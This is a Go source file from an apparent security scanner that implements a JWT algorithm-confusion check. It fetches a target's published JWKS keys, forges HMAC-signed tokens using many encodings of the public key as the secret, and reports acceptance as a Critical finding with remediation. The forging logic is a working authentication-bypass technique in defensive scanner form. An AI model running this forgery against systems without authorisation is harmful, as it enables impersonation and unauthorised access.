package lua_engine

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/http"
	"net/url"
	"strings"

	"github.com/londonmax12/hyperz/internal/httpclient"
)

// jwksBodyCap bounds the JWKS document body we buffer for parsing. A
// sane JWKS document advertises a handful of keys, each hundreds of
// bytes; 256 KiB swallows every real-world example we have seen while
// protecting the scanner from a hostile multi-megabyte response that
// would otherwise pin a goroutine in JSON unmarshal.
const jwksBodyCap = 256 << 10

// algConfusionMaxProbes caps the total forged-token requests one
// probeAlgConfusion call issues per JWT. A hardened validator rejects
// every variant, so worst case is keys * variants * hmac-algs (up to
// 27N for an RSA-keyed JWKS). The cap keeps the active footprint
// bounded; 60 covers ~6 keys at one variant + one alg apiece, or a
// JWKS of 2 keys fully exhausted (2 * 9 * 3 = 54).
const algConfusionMaxProbes = 60

// algConfusionDiscoveryPaths is the set of well-known suffixes the
// algorithm-confusion probe walks on the target's origin while
// hunting for a JWKS document. The OIDC discovery document at
// /.well-known/openid-configuration carries an indirect jwks_uri
// pointer, handled separately by the doc-then-jwks fetch path; the
// remaining entries are direct JWKS URLs.
var algConfusionDiscoveryPaths = []string{
	"/.well-known/jwks.json",
	"/.well-known/jwks",
	"/.well-known/openid-configuration",
	"/.well-known/oauth-authorization-server",
	"/jwks.json",
	"/jwks",
	"/oauth/jwks.json",
	"/oauth/v2/keys",
	"/api/jwks.json",
	"/auth/jwks.json",
	"/connect/jwk_uri",
}

// asymmetricJWTAlgs is the set of original-token algorithms the
// confusion probe targets. HS* tokens are out of scope: there is no
// "asymmetric -> HMAC confusion" attack against a token that is
// already HMAC-signed.
var asymmetricJWTAlgs = map[string]bool{
	"RS256": true, "RS384": true, "RS512": true,
	"PS256": true, "PS384": true, "PS512": true,
	"ES256": true, "ES384": true, "ES512": true,
}

// jwkKey is the JWK record subset the algorithm-confusion probe
// understands. RSA carries n/e; EC carries x/y/crv. Other parameters
// (use, alg, key_ops) are stored only so kid-matched lookups can
// stay informational.
type jwkKey struct {
	Kty string `json:"kty"`
	Kid string `json:"kid"`
	Alg string `json:"alg"`
	Use string `json:"use"`
	N   string `json:"n"`
	E   string `json:"e"`
	X   string `json:"x"`
	Y   string `json:"y"`
	Crv string `json:"crv"`
}

// jwksDoc is the wire shape of a JWKS document (RFC 7517 §5).
type jwksDoc struct {
	Keys []jwkKey `json:"keys"`
}

// jwksOIDCConfig is the subset of an OIDC discovery document the
// probe inspects to chain from the well-known config to the actual
// JWKS URL.
type jwksOIDCConfig struct {
	JwksURI string `json:"jwks_uri"`
}

// publicKeyMaterial captures one public key in every byte encoding
// the confusion probe will try as an HMAC secret. Different JWT
// libraries derive the HMAC key from different representations of
// the same public key, so each variant produces a distinct probe.
// origin records which discovery URL the key came from so the
// finding can name it.
type publicKeyMaterial struct {
	origin   string
	kid      string
	kty      string
	variants []publicKeyVariant
}

type publicKeyVariant struct {
	name  string
	bytes []byte
}

// probeAlgConfusion runs the classic RS256/ES256 -> HS256 attack:
// when the original token uses an asymmetric algorithm, fetch the
// validator's public key from well-known JWKS endpoints on the same
// origin (and from jku, if same-origin), then forge a token signed
// with HMAC using the public key bytes as the secret. A validator
// that does not pin the algorithm against the configured key type
// accepts the forgery because it treats the same key material as
// either an asymmetric public key or an HMAC shared secret depending
// on what the incoming alg header advertises.
//
// Returns the first finding fired; a single Critical for the whole
// token is enough - the report doesn't need to enumerate every
// encoding variant that worked.
func (c *JWTVulns) probeAlgConfusion(ctx context.Context, client *httpclient.Client, target string, src jwtSource, parsed *parsedJWT, oracle jwtOracle) *Finding {
	alg := strings.ToUpper(asString(parsed.header["alg"]))
	if !asymmetricJWTAlgs[alg] {
		return nil
	}
	keys := c.fetchAlgConfusionKeys(ctx, client, target, parsed)
	if len(keys) == 0 {
		return nil
	}
	probesSent := 0
	for _, key := range keys {
		if ctx.Err() != nil {
			return nil
		}
		for _, variant := range key.variants {
			if ctx.Err() != nil {
				return nil
			}
			for _, hsAlg := range []string{"HS256", "HS384", "HS512"} {
				if probesSent >= algConfusionMaxProbes {
					return nil
				}
				hdr := cloneHeader(parsed.header)
				hdr["alg"] = hsAlg
				if key.kid != "" {
					hdr["kid"] = key.kid
				}
				h := hashFor(hsAlg)
				if h == nil {
					continue
				}
				sig := hmacSign(h, variant.bytes, headerPayloadSigning(hdr, parsed.payloadRaw))
				token, err := assembleToken(hdr, parsed.payloadRaw, sig)
				if err != nil {
					continue
				}
				probesSent++
				probe, err := c.send(ctx, client, target, src, token)
				if err != nil {
					continue
				}
				if !looksAccepted(probe, oracle) {
					continue
				}
				return buildAlgConfusionFinding(target, parsed, key, variant, hsAlg, token, probe, oracle)
			}
		}
	}
	return nil
}

// fetchAlgConfusionKeys collects candidate public keys from the most
// productive discovery locations: the original token's jku (if it
// reaches the target origin), the OIDC discovery jwks_uri, and a
// short list of well-known direct JWKS paths on the same origin.
// All fetches are restricted to the target's scheme+host so the
// probe cannot reach off-scope addresses. Returns a deduplicated key
// set in discovery order; the empty return means the probe should
// back off because it has no key to forge with.
func (c *JWTVulns) fetchAlgConfusionKeys(ctx context.Context, client *httpclient.Client, target string, parsed *parsedJWT) []publicKeyMaterial {
	targetURL, err := url.Parse(target)
	if err != nil {
		return nil
	}
	origin := targetURL.Scheme + "://" + targetURL.Host

	seen := map[string]struct{}{}
	var out []publicKeyMaterial

	tryFetch := func(probeURL string) {
		if _, dup := seen[probeURL]; dup {
			return
		}
		seen[probeURL] = struct{}{}
		if !sameOriginURL(targetURL, probeURL) {
			return
		}
		body, ok := c.fetchKeyDoc(ctx, client, probeURL)
		if !ok {
			return
		}
		keys, indirect := parseAlgConfusionKeys(probeURL, body)
		if len(keys) > 0 {
			out = append(out, keys...)
			return
		}
		// OIDC discovery doc carried only a jwks_uri pointer. Follow it
		// exactly one hop so a misconfigured infinite chain cannot pin
		// the scan; the probe also re-applies the same-origin gate to
		// the indirect URL because nothing in the discovery doc is
		// trusted to bypass it.
		if indirect == "" {
			return
		}
		if _, dup := seen[indirect]; dup {
			return
		}
		seen[indirect] = struct{}{}
		if !sameOriginURL(targetURL, indirect) {
			return
		}
		body2, ok := c.fetchKeyDoc(ctx, client, indirect)
		if !ok {
			return
		}
		keys2, _ := parseAlgConfusionKeys(indirect, body2)
		out = append(out, keys2...)
	}

	if jku := asString(parsed.header["jku"]); jku != "" {
		tryFetch(jku)
	}
	if x5u := asString(parsed.header["x5u"]); x5u != "" {
		tryFetch(x5u)
	}
	for _, path := range algConfusionDiscoveryPaths {
		if ctx.Err() != nil {
			return out
		}
		tryFetch(origin + path)
	}
	return out
}

// fetchKeyDoc GETs probeURL and returns its body when the response
// is a 200 carrying something JSON-shaped. Non-200, transport
// failures, and oversize bodies all surface as "no document".
func (c *JWTVulns) fetchKeyDoc(ctx context.Context, client *httpclient.Client, probeURL string) ([]byte, bool) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
	if err != nil {
		return nil, false
	}
	req.Header.Set("Accept", "application/json")
	resp, err := client.Do(ctx, req)
	if err != nil {
		return nil, false
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		_, _, _ = httpclient.ReadBodyCapped(resp, 1<<10)
		return nil, false
	}
	body, _, err := httpclient.ReadBodyCapped(resp, jwksBodyCap)
	if err != nil {
		return nil, false
	}
	if !looksLikeJSON(body) {
		return nil, false
	}
	return body, true
}

// parseAlgConfusionKeys converts a JWKS body (or an OIDC discovery
// document whose jwks_uri we should chase) into the public-key
// material variants the probe will try. Returns either the direct
// keys (and an empty indirect URL), or no keys and the jwks_uri
// the OIDC discovery document pointed at; the caller is responsible
// for refetching at the indirect URL under the same scope gate.
func parseAlgConfusionKeys(probeURL string, body []byte) ([]publicKeyMaterial, string) {
	var jwks jwksDoc
	if err := json.Unmarshal(body, &jwks); err == nil && len(jwks.Keys) > 0 {
		var out []publicKeyMaterial
		for _, k := range jwks.Keys {
			if variants := publicKeyVariantsFor(k); len(variants) > 0 {
				out = append(out, publicKeyMaterial{
					origin:   probeURL,
					kid:      k.Kid,
					kty:      k.Kty,
					variants: variants,
				})
			}
		}
		if len(out) > 0 {
			return out, ""
		}
	}
	// Body did not parse as a direct JWKS document; treat it as an
	// OIDC discovery doc and surface the jwks_uri pointer for the
	// caller to chase. Single-hop indirection on purpose: a chain
	// longer than one is almost always a misconfiguration loop.
	var cfg jwksOIDCConfig
	if err := json.Unmarshal(body, &cfg); err != nil || cfg.JwksURI == "" {
		return nil, ""
	}
	return nil, cfg.JwksURI
}

// publicKeyVariantsFor renders one JWK into every byte encoding the
// confusion probe will try as an HMAC secret. The list is ordered
// roughly by how commonly the variant is the one a vulnerable
// library actually feeds to HMAC-Verify: PEM SPKI tops the list
// because the textbook PyJWT-pre-1.5 bug fed the PEM string directly
// into hmac.new.
func publicKeyVariantsFor(k jwkKey) []publicKeyVariant {
	switch strings.ToUpper(k.Kty) {
	case "RSA":
		return rsaPublicKeyVariants(k)
	case "EC":
		return ecPublicKeyVariants(k)
	}
	return nil
}

// rsaPublicKeyVariants enumerates the encodings of an RSA public
// key that real-world JWT libraries have historically passed
// verbatim into hmac.new. PEM SPKI is the textbook variant; the
// trailing newline variant covers libraries whose key loader appends
// "\n" to PEM blocks; the raw modulus and JWK JSON variants cover
// custom key derivations.
func rsaPublicKeyVariants(k jwkKey) []publicKeyVariant {
	if k.N == "" || k.E == "" {
		return nil
	}
	nBytes, err := decodeJWKBase64(k.N)
	if err != nil || len(nBytes) == 0 {
		return nil
	}
	eBytes, err := decodeJWKBase64(k.E)
	if err != nil || len(eBytes) == 0 {
		return nil
	}
	pub := &rsa.PublicKey{
		N: new(big.Int).SetBytes(nBytes),
		E: int(new(big.Int).SetBytes(eBytes).Int64()),
	}
	if pub.E == 0 {
		return nil
	}
	spkiDER, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil
	}
	spkiPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: spkiDER})
	pkcs1DER := x509.MarshalPKCS1PublicKey(pub)
	pkcs1PEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PUBLIC KEY", Bytes: pkcs1DER})
	jwkJSON, _ := json.Marshal(k)
	return []publicKeyVariant{
		{name: "pem-spki", bytes: spkiPEM},
		{name: "pem-spki-no-trailing-newline", bytes: stripTrailingNewline(spkiPEM)},
		{name: "der-spki", bytes: spkiDER},
		{name: "pem-pkcs1", bytes: pkcs1PEM},
		{name: "pem-pkcs1-no-trailing-newline", bytes: stripTrailingNewline(pkcs1PEM)},
		{name: "der-pkcs1", bytes: pkcs1DER},
		{name: "modulus-bytes", bytes: nBytes},
		{name: "modulus-base64url", bytes: []byte(k.N)},
		{name: "jwk-json", bytes: jwkJSON},
	}
}

// ecPublicKeyVariants enumerates the encodings of an EC public key
// in the same shape as the RSA path. The PEM SPKI variant covers
// the classic library bug; the raw uncompressed point covers
// implementations that derive the HMAC key off the X.962 point form.
func ecPublicKeyVariants(k jwkKey) []publicKeyVariant {
	if k.X == "" || k.Y == "" || k.Crv == "" {
		return nil
	}
	curve := curveFromCrv(k.Crv)
	if curve == nil {
		return nil
	}
	xBytes, err := decodeJWKBase64(k.X)
	if err != nil {
		return nil
	}
	yBytes, err := decodeJWKBase64(k.Y)
	if err != nil {
		return nil
	}
	pub := &ecdsa.PublicKey{
		Curve: curve,
		X:     new(big.Int).SetBytes(xBytes),
		Y:     new(big.Int).SetBytes(yBytes),
	}
	spkiDER, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return nil
	}
	spkiPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: spkiDER})
	uncompressedPoint := append([]byte{0x04}, append(xBytes, yBytes...)...)
	jwkJSON, _ := json.Marshal(k)
	return []publicKeyVariant{
		{name: "pem-spki", bytes: spkiPEM},
		{name: "pem-spki-no-trailing-newline", bytes: stripTrailingNewline(spkiPEM)},
		{name: "der-spki", bytes: spkiDER},
		{name: "ec-uncompressed-point", bytes: uncompressedPoint},
		{name: "x-bytes", bytes: xBytes},
		{name: "jwk-json", bytes: jwkJSON},
	}
}

// decodeJWKBase64 handles both the strict raw-url variant the JWK
// spec mandates and the padded form some sloppy IdPs emit. Falls
// back to standard padded base64 if rawurl fails so a JWKS published
// by a non-compliant authority does not silently break the probe.
func decodeJWKBase64(s string) ([]byte, error) {
	trimmed := strings.TrimRight(s, "=")
	if b, err := base64.RawURLEncoding.DecodeString(trimmed); err == nil {
		return b, nil
	}
	return base64.URLEncoding.DecodeString(s)
}

// curveFromCrv maps a JWK crv string to the elliptic.Curve the
// runtime needs for MarshalPKIXPublicKey. JOSE crv values are
// case-sensitive per RFC 7518; we normalise upper for defence in
// depth against IdPs that publish "p-256" lowercase.
func curveFromCrv(crv string) elliptic.Curve {
	switch strings.ToUpper(crv) {
	case "P-256":
		return elliptic.P256()
	case "P-384":
		return elliptic.P384()
	case "P-521":
		return elliptic.P521()
	}
	return nil
}

// stripTrailingNewline removes the trailing 0x0a a PEM encoder appends.
// Some library bugs feed the keyfile bytes minus the final newline
// into HMAC; the variant pair (with and without) exercises both.
func stripTrailingNewline(b []byte) []byte {
	if len(b) == 0 {
		return b
	}
	if b[len(b)-1] == '\n' {
		return b[:len(b)-1]
	}
	return b
}

// sameOriginURL gates JWKS-discovery fetches to the scheme+host of
// the target URL. Off-origin JWKS lookups would let a malicious
// jku/x5u in the original token redirect the probe to an attacker's
// host - the exact failure mode the OOB jku/x5u probe already
// detects through a different channel.
func sameOriginURL(target *url.URL, candidate string) bool {
	cu, err := url.Parse(candidate)
	if err != nil || cu.Scheme == "" || cu.Host == "" {
		return false
	}
	return strings.EqualFold(cu.Scheme, target.Scheme) && strings.EqualFold(cu.Host, target.Host)
}

// looksLikeJSON returns true when body's first non-whitespace byte is
// an object or array opener. The JWKS parser does the real work; this
// is just the cheap gate that lets us drop HTML/text 200s without
// running a json.Unmarshal that would print an error and burn CPU.
func looksLikeJSON(body []byte) bool {
	for _, b := range body {
		switch b {
		case ' ', '\t', '\n', '\r':
			continue
		case '{', '[':
			return true
		default:
			return false
		}
	}
	return false
}

// buildAlgConfusionFinding renders one Critical finding for an
// alg-confusion hit. The detail names the discovery URL and the key
// encoding that worked so a remediator can reproduce the attack
// from the finding alone.
func buildAlgConfusionFinding(target string, parsed *parsedJWT, key publicKeyMaterial, variant publicKeyVariant, hsAlg, token string, probe jwtSnapshot, oracle jwtOracle) *Finding {
	originalAlg := asString(parsed.header["alg"])
	detail := fmt.Sprintf(
		"The validator accepted a JWT whose JOSE alg field is %q and whose signature is HMAC over the public key the "+
			"application publishes at %s (kid=%q, encoding=%q). The original token used %s; treating the public key as "+
			"an HMAC shared secret is the algorithm-confusion attack against any validator that does not pin the "+
			"accepted algorithm against the configured key's type. The forged token landed at the authenticated "+
			"baseline (status %d, similarity %.3f to auth / %.3f to no-auth). An attacker can forge arbitrary "+
			"claims under the same public key the validator already publishes.",
		hsAlg, key.origin, key.kid, variant.name, originalAlg,
		probe.status,
		Similarity(probe.body, oracle.auth.body),
		Similarity(probe.body, oracle.noAuth.body),
	)
	return &Finding{
		Check:    "jwt-vulns",
		Target:   target,
		URL:      target,
		Severity: SeverityCritical,
		Title:    "JWT validator vulnerable to algorithm confusion (asymmetric -> HMAC)",
		Detail:   detail,
		CWE:      "CWE-347",
		OWASP:    "A02:2021 Cryptographic Failures",
		Remediation: "Pin the accepted algorithm set at the validator and assert it matches the configured key type before " +
			"the signature is verified (asymmetric key -> reject HS*; symmetric key -> reject RS*/ES*/PS*). Most JWT " +
			"libraries expose an algorithms parameter on verify - pass exactly the algorithm your tokens are signed " +
			"with, never the alg value off the incoming header. As defence in depth, store signing keys typed (e.g. " +
			"crypto.PublicKey vs []byte) so a mis-call cannot pass an asymmetric key into an HMAC verifier.",
		Evidence: &Evidence{
			Method:     http.MethodGet,
			RequestURL: target,
			Status:     probe.status,
			Snippet: fmt.Sprintf(
				"Original alg: %s\nForged alg: %s\nKey discovery URL: %s\nKey ID: %s\nKey type: %s\nKey encoding tried: %s\nForged token: %s\nAuth baseline: status=%d\nNo-auth baseline: status=%d\nProbe response: status=%d\nSimilarity to auth: %.3f\nSimilarity to no-auth: %.3f",
				originalAlg, hsAlg, key.origin, key.kid, key.kty, variant.name, redactToken(token),
				oracle.auth.status, oracle.noAuth.status, probe.status,
				Similarity(probe.body, oracle.auth.body),
				Similarity(probe.body, oracle.noAuth.body),
			),
		},
		DedupeKey: MakeKey("jwt-vulns", ScopeHost, target, "alg-confusion", "key:"+key.origin),
	}
}
